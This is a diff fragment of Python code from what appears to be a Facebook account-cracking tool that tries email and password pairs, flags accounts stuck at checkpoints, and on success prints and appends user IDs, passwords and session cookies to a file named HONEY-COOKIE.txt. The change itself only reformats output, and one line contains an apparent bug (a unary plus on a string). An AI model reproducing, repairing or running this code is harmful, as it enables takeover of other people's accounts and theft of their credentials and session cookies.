@@ -232,7 +232,6 @@ class create:
                 cok = self.ses.cookies.get_dict()
                 if 'checkpoint' in getts.url:
                     cp.append(email+passw)
-                    print ('\r\033[1;33m[CP] '+cok['c_user']+' | '+passw+'\033[0;97m     ')
                 dbl = ['fb_dtsg', 'jazoest', 'flow', 'next', 'nux_source']
                 for x in BeautifulSoup(getts.text, 'html.parser').find_all('form', {'method': 'post'}):
                     if '/login/device-based/update-nonce/' in str(x):
@@ -262,7 +261,7 @@ class create:
                                 else:
                                     coki = (";").join([ "%s=%s" % (key, value) for key, value in self.ses.cookies.get_dict().items() ])
                                     cok = self.ses.cookies.get_dict()
-                                    print ('\r\033[1;32m[OK] '+cok['c_user']+' | '+passw+' | '+coki+'\033[0;97m     ')
+                                    print ('\r\033[1;32m'+cok['c_user']+'|'+passw+'|'+coki+'\033[0;97m     ')
                                     open('/sdcard/HONEY-COOKIE.txt','a').write(+cok['c_user']+'|'+passw+ ' | ' +coki+'\n')
                                     ok.append(email+passw)
             except requests.exceptions.ConnectionError:
